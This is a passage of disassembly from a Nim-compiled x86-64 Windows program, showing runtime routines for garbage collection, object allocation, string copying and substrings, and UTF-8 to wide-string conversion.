  403971:	49 c7 85 a0 33 00 00 	movq   $0x0,0x33a0(%r13)
  403978:	00 00 00 00 
  40397c:	e8 25 ec ff ff       	call   4025a6 <deallocImpl__lmwgHsdhTsrQaepFju8wew>
  403981:	b9 00 20 00 00       	mov    $0x2000,%ecx
  403986:	49 c7 85 a8 33 00 00 	movq   $0x0,0x33a8(%r13)
  40398d:	00 00 00 00 
  403991:	49 c7 85 90 33 00 00 	movq   $0x0,0x3390(%r13)
  403998:	00 00 00 00 
  40399c:	e8 c1 f5 ff ff       	call   402f62 <alloc0Impl__WrVG9abV9chlTLqkiXYLKwUg>
  4039a1:	49 8b 7d 40          	mov    0x40(%r13),%rdi
  4039a5:	49 c7 85 98 33 00 00 	movq   $0x3ff,0x3398(%r13)
  4039ac:	ff 03 00 00 
  4039b0:	49 89 85 a8 33 00 00 	mov    %rax,0x33a8(%r13)
  4039b7:	49 8b 45 30          	mov    0x30(%r13),%rax
  4039bb:	49 c7 85 90 33 00 00 	movq   $0x0,0x3390(%r13)
  4039c2:	00 00 00 00 
  4039c6:	49 c7 85 a0 33 00 00 	movq   $0x0,0x33a0(%r13)
  4039cd:	00 00 00 00 
  4039d1:	48 8d 70 ff          	lea    -0x1(%rax),%rsi
  4039d5:	eb 1f                	jmp    4039f6 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x216>
  4039d7:	48 8b 19             	mov    (%rcx),%rbx
  4039da:	e8 c7 eb ff ff       	call   4025a6 <deallocImpl__lmwgHsdhTsrQaepFju8wew>
  4039df:	48 89 d9             	mov    %rbx,%rcx
  4039e2:	e9 7c ff ff ff       	jmp    403963 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x183>
  4039e7:	48 8b 14 df          	mov    (%rdi,%rbx,8),%rdx
  4039eb:	4c 89 e9             	mov    %r13,%rcx
  4039ee:	48 ff c3             	inc    %rbx
  4039f1:	e8 c7 f6 ff ff       	call   4030bd <markS__SOJE9bROCOc8iabVsKM64Sg>
  4039f6:	48 39 de             	cmp    %rbx,%rsi
  4039f9:	7d ec                	jge    4039e7 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x207>
  4039fb:	49 83 bd 00 34 00 00 	cmpq   $0x0,0x3400(%r13)
  403a02:	00 
  403a03:	75 21                	jne    403a26 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x246>
  403a05:	48 8b 05 34 e1 01 00 	mov    0x1e134(%rip),%rax        # 421b40 <globalMarkersLen>
  403a0c:	48 8d 3d cd 73 01 00 	lea    0x173cd(%rip),%rdi        # 41ade0 <globalMarkers>
  403a13:	31 db                	xor    %ebx,%ebx
  403a15:	48 8d 70 ff          	lea    -0x1(%rax),%rsi
  403a19:	48 39 de             	cmp    %rbx,%rsi
  403a1c:	7c 08                	jl     403a26 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x246>
  403a1e:	ff 14 df             	call   *(%rdi,%rbx,8)
  403a21:	48 ff c3             	inc    %rbx
  403a24:	eb f3                	jmp    403a19 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x239>
  403a26:	48 8b 05 93 73 01 00 	mov    0x17393(%rip),%rax        # 41adc0 <threadLocalMarkersLen>
  403a2d:	48 8d 3d 2c 06 01 00 	lea    0x1062c(%rip),%rdi        # 414060 <threadLocalMarkers>
  403a34:	31 db                	xor    %ebx,%ebx
  403a36:	48 8d 70 ff          	lea    -0x1(%rax),%rsi
  403a3a:	48 39 de             	cmp    %rbx,%rsi
  403a3d:	7d 16                	jge    403a55 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x275>
  403a3f:	49 8b 85 b0 33 00 00 	mov    0x33b0(%r13),%rax
  403a46:	31 db                	xor    %ebx,%ebx
  403a48:	49 8b bd c0 33 00 00 	mov    0x33c0(%r13),%rdi
  403a4f:	48 8d 70 ff          	lea    -0x1(%rax),%rsi
  403a53:	eb 08                	jmp    403a5d <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x27d>
  403a55:	ff 14 df             	call   *(%rdi,%rbx,8)
  403a58:	48 ff c3             	inc    %rbx
  403a5b:	eb dd                	jmp    403a3a <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x25a>
  403a5d:	48 39 de             	cmp    %rbx,%rsi
  403a60:	7c 11                	jl     403a73 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x293>
  403a62:	48 8b 14 df          	mov    (%rdi,%rbx,8),%rdx
  403a66:	4c 89 e9             	mov    %r13,%rcx
  403a69:	48 ff c3             	inc    %rbx
  403a6c:	e8 4c f6 ff ff       	call   4030bd <markS__SOJE9bROCOc8iabVsKM64Sg>
  403a71:	eb ea                	jmp    403a5d <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x27d>
  403a73:	4d 8d 75 68          	lea    0x68(%r13),%r14
  403a77:	41 c6 85 30 31 00 00 	movb   $0x1,0x3130(%r13)
  403a7e:	01 
  403a7f:	45 31 e4             	xor    %r12d,%r12d
  403a82:	49 8d 85 10 29 00 00 	lea    0x2910(%r13),%rax
  403a89:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
  403a8e:	4b 8b b4 e5 10 29 00 	mov    0x2910(%r13,%r12,8),%rsi
  403a95:	00 
  403a96:	48 85 f6             	test   %rsi,%rsi
  403a99:	75 58                	jne    403af3 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x313>
  403a9b:	49 ff c4             	inc    %r12
  403a9e:	49 81 fc 00 01 00 00 	cmp    $0x100,%r12
  403aa5:	75 e7                	jne    403a8e <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x2ae>
  403aa7:	49 ff 85 60 33 00 00 	incq   0x3360(%r13)
  403aae:	41 c6 85 30 31 00 00 	movb   $0x0,0x3130(%r13)
  403ab5:	00 
  403ab6:	e8 e5 e1 ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  403abb:	ba 00 00 40 00       	mov    $0x400000,%edx
  403ac0:	48 8b 80 38 29 00 00 	mov    0x2938(%rax),%rax
  403ac7:	48 01 c0             	add    %rax,%rax
  403aca:	48 3d 00 00 40 00    	cmp    $0x400000,%rax
  403ad0:	48 0f 4c c2          	cmovl  %rdx,%rax
  403ad4:	49 39 85 68 33 00 00 	cmp    %rax,0x3368(%r13)
  403adb:	49 89 45 08          	mov    %rax,0x8(%r13)
  403adf:	49 0f 4d 85 68 33 00 	cmovge 0x3368(%r13),%rax
  403ae6:	00 
  403ae7:	49 89 85 68 33 00 00 	mov    %rax,0x3368(%r13)
  403aee:	e9 f7 00 00 00       	jmp    403bea <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x40a>
  403af3:	31 ff                	xor    %edi,%edi
  403af5:	48 8b 6c fe 10       	mov    0x10(%rsi,%rdi,8),%rbp
  403afa:	48 89 f8             	mov    %rdi,%rax
  403afd:	48 c1 e0 06          	shl    $0x6,%rax
  403b01:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  403b06:	48 85 ed             	test   %rbp,%rbp
  403b09:	75 11                	jne    403b1c <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x33c>
  403b0b:	48 ff c7             	inc    %rdi
  403b0e:	48 83 ff 08          	cmp    $0x8,%rdi
  403b12:	75 e1                	jne    403af5 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x315>
  403b14:	48 8b 36             	mov    (%rsi),%rsi
  403b17:	e9 7a ff ff ff       	jmp    403a96 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x2b6>
  403b1c:	40 f6 c5 01          	test   $0x1,%bpl
  403b20:	0f 84 b7 00 00 00    	je     403bdd <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x3fd>
  403b26:	48 8b 5e 08          	mov    0x8(%rsi),%rbx
  403b2a:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
  403b2f:	48 c1 e3 09          	shl    $0x9,%rbx
  403b33:	48 0b 5c 24 28       	or     0x28(%rsp),%rbx
  403b38:	48 89 da             	mov    %rbx,%rdx
  403b3b:	e8 92 dd ff ff       	call   4018d2 <contains__9b5xR7VBZVwQDvk5Nr9bDKdQ>
  403b40:	84 c0                	test   %al,%al
  403b42:	0f 84 95 00 00 00    	je     403bdd <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x3fd>
  403b48:	48 89 da             	mov    %rbx,%rdx
  403b4b:	48 c1 e2 0c          	shl    $0xc,%rdx
  403b4f:	f6 02 01             	testb  $0x1,(%rdx)
  403b52:	0f 84 85 00 00 00    	je     403bdd <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x3fd>
  403b58:	4c 8b 7a 08          	mov    0x8(%rdx),%r15
  403b5c:	49 81 ff c8 0f 00 00 	cmp    $0xfc8,%r15
  403b63:	7e 09                	jle    403b6e <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x38e>
  403b65:	48 83 7a 28 01       	cmpq   $0x1,0x28(%rdx)
  403b6a:	77 49                	ja     403bb5 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x3d5>
  403b6c:	eb 6f                	jmp    403bdd <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x3fd>
  403b6e:	48 8b 42 30          	mov    0x30(%rdx),%rax
  403b72:	48 8d 5a 38          	lea    0x38(%rdx),%rbx
  403b76:	48 01 d8             	add    %rbx,%rax
  403b79:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  403b7e:	48 39 5c 24 30       	cmp    %rbx,0x30(%rsp)
  403b83:	76 58                	jbe    403bdd <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x3fd>
  403b85:	48 83 7b 08 01       	cmpq   $0x1,0x8(%rbx)
  403b8a:	76 24                	jbe    403bb0 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x3d0>
  403b8c:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
  403b91:	48 89 da             	mov    %rbx,%rdx
  403b94:	e8 c3 da ff ff       	call   40165c <contains__ClLkUQKF8KrRxQPdAJDd5w>
  403b99:	84 c0                	test   %al,%al
  403b9b:	75 13                	jne    403bb0 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x3d0>
  403b9d:	48 89 d9             	mov    %rbx,%rcx
  403ba0:	e8 b1 e1 ff ff       	call   401d56 <prepareDealloc__fvhnFro5wEfzy879alizcUQ>
  403ba5:	48 89 da             	mov    %rbx,%rdx
  403ba8:	4c 89 f1             	mov    %r14,%rcx
  403bab:	e8 64 e8 ff ff       	call   402414 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ>
  403bb0:	4c 01 fb             	add    %r15,%rbx
  403bb3:	eb c9                	jmp    403b7e <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x39e>
  403bb5:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
  403bba:	48 8d 5a 20          	lea    0x20(%rdx),%rbx
  403bbe:	48 89 da             	mov    %rbx,%rdx
  403bc1:	e8 96 da ff ff       	call   40165c <contains__ClLkUQKF8KrRxQPdAJDd5w>
  403bc6:	84 c0                	test   %al,%al
  403bc8:	75 13                	jne    403bdd <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x3fd>
  403bca:	48 89 d9             	mov    %rbx,%rcx
  403bcd:	e8 84 e1 ff ff       	call   401d56 <prepareDealloc__fvhnFro5wEfzy879alizcUQ>
  403bd2:	48 89 da             	mov    %rbx,%rdx
  403bd5:	4c 89 f1             	mov    %r14,%rcx
  403bd8:	e8 37 e8 ff ff       	call   402414 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ>
  403bdd:	48 ff 44 24 28       	incq   0x28(%rsp)
  403be2:	48 d1 ed             	shr    $1,%rbp
  403be5:	e9 1c ff ff ff       	jmp    403b06 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x326>
  403bea:	49 8b 45 30          	mov    0x30(%r13),%rax
  403bee:	31 db                	xor    %ebx,%ebx
  403bf0:	49 8b 7d 40          	mov    0x40(%r13),%rdi
  403bf4:	48 8d 70 ff          	lea    -0x1(%rax),%rsi
  403bf8:	48 39 de             	cmp    %rbx,%rsi
  403bfb:	7d 24                	jge    403c21 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x441>
  403bfd:	49 8b 45 18          	mov    0x18(%r13),%rax
  403c01:	ba f4 01 00 00       	mov    $0x1f4,%edx
  403c06:	49 c7 45 30 00 00 00 	movq   $0x0,0x30(%r13)
  403c0d:	00 
  403c0e:	48 01 c0             	add    %rax,%rax
  403c11:	48 3d f4 01 00 00    	cmp    $0x1f4,%rax
  403c17:	48 0f 4c c2          	cmovl  %rdx,%rax
  403c1b:	49 89 45 10          	mov    %rax,0x10(%r13)
  403c1f:	eb 0e                	jmp    403c2f <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x44f>
  403c21:	48 8b 0c df          	mov    (%rdi,%rbx,8),%rcx
  403c25:	48 ff c3             	inc    %rbx
  403c28:	e8 64 f2 ff ff       	call   402e91 <decRef__AT1eRuflKWyTTBdLjEDZbgsystem.lto_priv.83>
  403c2d:	eb c9                	jmp    403bf8 <collectCT__XHio9cMpnLoH7GyCj1Z9besg+0x418>
  403c2f:	48 83 c4 48          	add    $0x48,%rsp
  403c33:	5b                   	pop    %rbx
  403c34:	5e                   	pop    %rsi
  403c35:	5f                   	pop    %rdi
  403c36:	5d                   	pop    %rbp
  403c37:	41 5c                	pop    %r12
  403c39:	41 5d                	pop    %r13
  403c3b:	41 5e                	pop    %r14
  403c3d:	41 5f                	pop    %r15
  403c3f:	c3                   	ret

0000000000403c40 <copyStringRC1>:
  403c40:	57                   	push   %rdi
  403c41:	56                   	push   %rsi
  403c42:	53                   	push   %rbx
  403c43:	48 83 ec 20          	sub    $0x20,%rsp
  403c47:	48 85 c9             	test   %rcx,%rcx
  403c4a:	48 89 ce             	mov    %rcx,%rsi
  403c4d:	0f 84 88 00 00 00    	je     403cdb <copyStringRC1+0x9b>
  403c53:	48 83 79 08 00       	cmpq   $0x0,0x8(%rcx)
  403c58:	78 7c                	js     403cd6 <copyStringRC1+0x96>
  403c5a:	48 8b 19             	mov    (%rcx),%rbx
  403c5d:	b8 07 00 00 00       	mov    $0x7,%eax
  403c62:	48 83 fb 07          	cmp    $0x7,%rbx
  403c66:	48 0f 4c d8          	cmovl  %rax,%rbx
  403c6a:	48 83 c6 10          	add    $0x10,%rsi
  403c6e:	e8 2d e0 ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  403c73:	48 8d 48 38          	lea    0x38(%rax),%rcx
  403c77:	48 89 c7             	mov    %rax,%rdi
  403c7a:	e8 61 fb ff ff       	call   4037e0 <collectCT__XHio9cMpnLoH7GyCj1Z9besg>
  403c7f:	48 8d 8f a0 00 00 00 	lea    0xa0(%rdi),%rcx
  403c86:	48 8d 53 21          	lea    0x21(%rbx),%rdx
  403c8a:	e8 d8 ec ff ff       	call   402967 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ>
  403c8f:	48 8d 53 11          	lea    0x11(%rbx),%rdx
  403c93:	48 89 c7             	mov    %rax,%rdi
  403c96:	4c 8d 4f 10          	lea    0x10(%rdi),%r9
  403c9a:	48 c7 07 08 00 00 00 	movq   $0x8,(%rdi)
  403ca1:	48 8d 05 78 73 00 00 	lea    0x7378(%rip),%rax        # 40b020 <strDesc__D0UzA4zsDu5tgpJQ9a9clXPg>
  403ca8:	4c 89 c9             	mov    %r9,%rcx
  403cab:	48 89 47 08          	mov    %rax,0x8(%rdi)
  403caf:	e8 0e dd ff ff       	call   4019c2 <nimZeroMem.lto_priv.59>
  403cb4:	48 8b 46 f0          	mov    -0x10(%rsi),%rax
  403cb8:	48 89 5f 18          	mov    %rbx,0x18(%rdi)
  403cbc:	48 89 47 10          	mov    %rax,0x10(%rdi)
  403cc0:	48 8b 56 f0          	mov    -0x10(%rsi),%rdx
  403cc4:	48 8d 47 20          	lea    0x20(%rdi),%rax
  403cc8:	48 89 c7             	mov    %rax,%rdi
  403ccb:	48 8d 4a 01          	lea    0x1(%rdx),%rcx
  403ccf:	f3 a4                	rep movsb (%rsi),(%rdi)
  403cd1:	4c 89 ce             	mov    %r9,%rsi
  403cd4:	eb 05                	jmp    403cdb <copyStringRC1+0x9b>
  403cd6:	48 83 41 f0 08       	addq   $0x8,-0x10(%rcx)
  403cdb:	48 89 f0             	mov    %rsi,%rax
  403cde:	48 83 c4 20          	add    $0x20,%rsp
  403ce2:	5b                   	pop    %rbx
  403ce3:	5e                   	pop    %rsi
  403ce4:	5f                   	pop    %rdi
  403ce5:	c3                   	ret

0000000000403ce6 <newObj>:
  403ce6:	55                   	push   %rbp
  403ce7:	57                   	push   %rdi
  403ce8:	56                   	push   %rsi
  403ce9:	53                   	push   %rbx
  403cea:	48 83 ec 28          	sub    $0x28,%rsp
  403cee:	48 89 d6             	mov    %rdx,%rsi
  403cf1:	48 89 cd             	mov    %rcx,%rbp
  403cf4:	e8 a7 df ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  403cf9:	48 8d 78 38          	lea    0x38(%rax),%rdi
  403cfd:	48 89 c3             	mov    %rax,%rbx
  403d00:	48 89 f9             	mov    %rdi,%rcx
  403d03:	e8 d8 fa ff ff       	call   4037e0 <collectCT__XHio9cMpnLoH7GyCj1Z9besg>
  403d08:	48 8d 56 10          	lea    0x10(%rsi),%rdx
  403d0c:	48 8d 8b a0 00 00 00 	lea    0xa0(%rbx),%rcx
  403d13:	e8 4f ec ff ff       	call   402967 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ>
  403d18:	48 89 fa             	mov    %rdi,%rdx
  403d1b:	48 89 c3             	mov    %rax,%rbx
  403d1e:	48 89 68 08          	mov    %rbp,0x8(%rax)
  403d22:	48 89 c1             	mov    %rax,%rcx
  403d25:	48 c7 00 04 00 00 00 	movq   $0x4,(%rax)
  403d2c:	48 83 c3 10          	add    $0x10,%rbx
  403d30:	e8 96 ee ff ff       	call   402bcb <addNewObjToZCT__xkq8ZbJr9bIUKHN9cK4tT5NAsystem.constprop.47>
  403d35:	48 89 f2             	mov    %rsi,%rdx
  403d38:	48 89 d9             	mov    %rbx,%rcx
  403d3b:	e8 82 dc ff ff       	call   4019c2 <nimZeroMem.lto_priv.59>
  403d40:	48 89 d8             	mov    %rbx,%rax
  403d43:	48 83 c4 28          	add    $0x28,%rsp
  403d47:	5b                   	pop    %rbx
  403d48:	5e                   	pop    %rsi
  403d49:	5f                   	pop    %rdi
  403d4a:	5d                   	pop    %rbp
  403d4b:	c3                   	ret

0000000000403d4c <rawNewString>:
  403d4c:	53                   	push   %rbx
  403d4d:	48 83 ec 20          	sub    $0x20,%rsp
  403d51:	bb 07 00 00 00       	mov    $0x7,%ebx
  403d56:	48 83 f9 07          	cmp    $0x7,%rcx
  403d5a:	48 0f 4d d9          	cmovge %rcx,%rbx
  403d5e:	48 8d 0d bb 72 00 00 	lea    0x72bb(%rip),%rcx        # 40b020 <strDesc__D0UzA4zsDu5tgpJQ9a9clXPg>
  403d65:	48 8d 53 11          	lea    0x11(%rbx),%rdx
  403d69:	e8 78 ff ff ff       	call   403ce6 <newObj>
  403d6e:	48 89 58 08          	mov    %rbx,0x8(%rax)
  403d72:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
  403d79:	48 83 c4 20          	add    $0x20,%rsp
  403d7d:	5b                   	pop    %rbx
  403d7e:	c3                   	ret

0000000000403d7f <plusdollar___fd78UIeRDjLSmDeP2Y7tYgwinstr.lto_priv.70>:
  403d7f:	41 54                	push   %r12
  403d81:	55                   	push   %rbp
  403d82:	57                   	push   %rdi
  403d83:	56                   	push   %rsi
  403d84:	53                   	push   %rbx
  403d85:	48 83 ec 30          	sub    $0x30,%rsp
  403d89:	31 ed                	xor    %ebp,%ebp
  403d8b:	e8 d8 d7 ff ff       	call   401568 <amp___aQWwfRzjgGaDTaTDjMS9cmgwinstr.lto_priv.72>
  403d90:	48 85 c9             	test   %rcx,%rcx
  403d93:	48 89 c7             	mov    %rax,%rdi
  403d96:	74 03                	je     403d9b <plusdollar___fd78UIeRDjLSmDeP2Y7tYgwinstr.lto_priv.70+0x1c>
  403d98:	48 8b 29             	mov    (%rcx),%rbp
  403d9b:	31 f6                	xor    %esi,%esi
  403d9d:	48 85 ff             	test   %rdi,%rdi
  403da0:	74 63                	je     403e05 <plusdollar___fd78UIeRDjLSmDeP2Y7tYgwinstr.lto_priv.70+0x86>
  403da2:	41 89 e9             	mov    %ebp,%r9d
  403da5:	49 89 f8             	mov    %rdi,%r8
  403da8:	31 d2                	xor    %edx,%edx
  403daa:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
  403db1:	00 
  403db2:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
  403db9:	00 00 
  403dbb:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
  403dc0:	ff 15 52 6f 02 00    	call   *0x26f52(%rip)        # 42ad18 <Dl_32565001_>
  403dc6:	48 63 d8             	movslq %eax,%rbx
  403dc9:	49 89 dc             	mov    %rbx,%r12
  403dcc:	48 ff c3             	inc    %rbx
  403dcf:	48 01 db             	add    %rbx,%rbx
  403dd2:	48 89 d9             	mov    %rbx,%rcx
  403dd5:	e8 72 ff ff ff       	call   403d4c <rawNewString>
  403dda:	48 89 c1             	mov    %rax,%rcx
  403ddd:	48 89 18             	mov    %rbx,(%rax)
  403de0:	48 89 c6             	mov    %rax,%rsi
  403de3:	e8 80 d7 ff ff       	call   401568 <amp___aQWwfRzjgGaDTaTDjMS9cmgwinstr.lto_priv.72>
  403de8:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
  403ded:	41 89 e9             	mov    %ebp,%r9d
  403df0:	49 89 f8             	mov    %rdi,%r8
  403df3:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  403df8:	31 d2                	xor    %edx,%edx
  403dfa:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
  403dff:	ff 15 13 6f 02 00    	call   *0x26f13(%rip)        # 42ad18 <Dl_32565001_>
  403e05:	48 89 f0             	mov    %rsi,%rax
  403e08:	48 83 c4 30          	add    $0x30,%rsp
  403e0c:	5b                   	pop    %rbx
  403e0d:	5e                   	pop    %rsi
  403e0e:	5f                   	pop    %rdi
  403e0f:	5d                   	pop    %rbp
  403e10:	41 5c                	pop    %r12
  403e12:	c3                   	ret

0000000000403e13 <substr__2yh9cer0ymNRHlOOg8P7IuA>:
  403e13:	55                   	push   %rbp
  403e14:	57                   	push   %rdi
  403e15:	56                   	push   %rsi
  403e16:	53                   	push   %rbx
  403e17:	48 83 ec 28          	sub    $0x28,%rsp
  403e1b:	be 00 00 00 00       	mov    $0x0,%esi
  403e20:	48 85 d2             	test   %rdx,%rdx
  403e23:	48 89 cf             	mov    %rcx,%rdi
  403e26:	48 0f 49 f2          	cmovns %rdx,%rsi
  403e2a:	48 83 cb ff          	or     $0xffffffffffffffff,%rbx
  403e2e:	48 85 c9             	test   %rcx,%rcx
  403e31:	74 06                	je     403e39 <substr__2yh9cer0ymNRHlOOg8P7IuA+0x26>
  403e33:	48 8b 01             	mov    (%rcx),%rax
  403e36:	48 01 c3             	add    %rax,%rbx
  403e39:	4c 39 c3             	cmp    %r8,%rbx
  403e3c:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
  403e43:	49 0f 4f d8          	cmovg  %r8,%rbx
  403e47:	48 29 f3             	sub    %rsi,%rbx
  403e4a:	48 0f 48 d8          	cmovs  %rax,%rbx
  403e4e:	48 01 fe             	add    %rdi,%rsi
  403e51:	48 8d 6b 01          	lea    0x1(%rbx),%rbp
  403e55:	48 89 e9             	mov    %rbp,%rcx
  403e58:	e8 ef fe ff ff       	call   403d4c <rawNewString>
  403e5d:	45 31 c0             	xor    %r8d,%r8d
  403e60:	48 89 28             	mov    %rbp,(%rax)
  403e63:	4c 39 c3             	cmp    %r8,%rbx
  403e66:	7c 0f                	jl     403e77 <substr__2yh9cer0ymNRHlOOg8P7IuA+0x64>
  403e68:	42 8a 54 06 10       	mov    0x10(%rsi,%r8,1),%dl
  403e6d:	42 88 54 00 10       	mov    %dl,0x10(%rax,%r8,1)
  403e72:	49 ff c0             	inc    %r8
  403e75:	eb ec                	jmp    403e63 <substr__2yh9cer0ymNRHlOOg8P7IuA+0x50>
  403e77:	48 83 c4 28          	add    $0x28,%rsp
  403e7b:	5b                   	pop    %rbx
  403e7c:	5e                   	pop    %rsi
  403e7d:	5f                   	pop    %rdi
  403e7e:	5d                   	pop    %rbp
  403e7f:	c3                   	ret

0000000000403e80 <newWideCString__K8rR70TBwrP6FNBzDhVVOA>:
  403e80:	41 54                	push   %r12
  403e82:	55                   	push   %rbp
  403e83:	57                   	push   %rdi
  403e84:	56                   	push   %rsi
  403e85:	53                   	push   %rbx
  403e86:	48 83 ec 20          	sub    $0x20,%rsp
  403e8a:	48 8d 04 95 02 00 00 	lea    0x2(,%rdx,4),%rax
  403e91:	00 
  403e92:	48 89 d6             	mov    %rdx,%rsi
  403e95:	48 89 cb             	mov    %rcx,%rbx
  403e98:	48 8d 14 85 02 00 00 	lea    0x2(,%rax,4),%rdx
  403e9f:	00 
  403ea0:	48 8d 0d b9 11 02 00 	lea    0x211b9(%rip),%rcx        # 425060 <NTI__4HwedE75WPfqZSQ0Cq2OUg_>
  403ea7:	e8 3a fe ff ff       	call   403ce6 <newObj>
  403eac:	48 8d 7e fd          	lea    -0x3(%rsi),%rdi
  403eb0:	31 c9                	xor    %ecx,%ecx
  403eb2:	45 31 c0             	xor    %r8d,%r8d
  403eb5:	4c 8d 56 ff          	lea    -0x1(%rsi),%r10
  403eb9:	4c 8d 5e fe          	lea    -0x2(%rsi),%r11
  403ebd:	4f 8d 0c 00          	lea    (%r8,%r8,1),%r9
  403ec1:	48 39 f1             	cmp    %rsi,%rcx
  403ec4:	4a 8d 2c 08          	lea    (%rax,%r9,1),%rbp
  403ec8:	0f 8d 55 01 00 00    	jge    404023 <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0x1a3>
  403ece:	44 8a 24 0b          	mov    (%rbx,%rcx,1),%r12b
  403ed2:	45 84 e4             	test   %r12b,%r12b
  403ed5:	79 0d                	jns    403ee4 <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0x64>
  403ed7:	44 89 e2             	mov    %r12d,%edx
  403eda:	c0 ea 05             	shr    $0x5,%dl
  403edd:	80 fa 06             	cmp    $0x6,%dl
  403ee0:	75 0e                	jne    403ef0 <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0x70>
  403ee2:	eb 19                	jmp    403efd <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0x7d>
  403ee4:	49 0f be d4          	movsbq %r12b,%rdx
  403ee8:	48 ff c1             	inc    %rcx
  403eeb:	e9 1f 01 00 00       	jmp    40400f <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0x18f>
  403ef0:	44 89 e2             	mov    %r12d,%edx
  403ef3:	c0 ea 04             	shr    $0x4,%dl
  403ef6:	80 fa 0e             	cmp    $0xe,%dl
  403ef9:	75 2b                	jne    403f26 <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0xa6>
  403efb:	eb 36                	jmp    403f33 <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0xb3>
  403efd:	49 39 ca             	cmp    %rcx,%r10
  403f00:	7e 6d                	jle    403f6f <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0xef>
  403f02:	8a 54 0b 01          	mov    0x1(%rbx,%rcx,1),%dl
  403f06:	48 83 c1 02          	add    $0x2,%rcx
  403f0a:	49 89 d1             	mov    %rdx,%r9
  403f0d:	4c 89 e2             	mov    %r12,%rdx
  403f10:	48 c1 e2 06          	shl    $0x6,%rdx
  403f14:	41 83 e1 3f          	and    $0x3f,%r9d
  403f18:	81 e2 c0 07 00 00    	and    $0x7c0,%edx
  403f1e:	4c 09 ca             	or     %r9,%rdx
  403f21:	e9 e9 00 00 00       	jmp    40400f <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0x18f>
  403f26:	44 89 e2             	mov    %r12d,%edx
  403f29:	c0 ea 03             	shr    $0x3,%dl
  403f2c:	80 fa 1e             	cmp    $0x1e,%dl
  403f2f:	75 3e                	jne    403f6f <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0xef>
  403f31:	eb 37                	jmp    403f6a <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0xea>
  403f33:	49 39 cb             	cmp    %rcx,%r11
  403f36:	7e 37                	jle    403f6f <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0xef>
  403f38:	8a 54 0b 02          	mov    0x2(%rbx,%rcx,1),%dl
  403f3c:	49 c1 e4 0c          	shl    $0xc,%r12
  403f40:	44 0f b6 4c 0b 01    	movzbl 0x1(%rbx,%rcx,1),%r9d
  403f46:	41 81 e4 00 f0 00 00 	and    $0xf000,%r12d
  403f4d:	48 83 c1 03          	add    $0x3,%rcx
  403f51:	83 e2 3f             	and    $0x3f,%edx
  403f54:	49 c1 e1 06          	shl    $0x6,%r9
  403f58:	4c 09 e2             	or     %r12,%rdx
  403f5b:	41 81 e1 c0 0f 00 00 	and    $0xfc0,%r9d
  403f62:	4c 09 ca             	or     %r9,%rdx
  403f65:	e9 93 00 00 00       	jmp    403ffd <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0x17d>
  403f6a:	48 39 cf             	cmp    %rcx,%rdi
  403f6d:	7f 0d                	jg     403f7c <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0xfc>
  403f6f:	48 ff c1             	inc    %rcx
  403f72:	ba fd ff 00 00       	mov    $0xfffd,%edx
  403f77:	e9 93 00 00 00       	jmp    40400f <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0x18f>
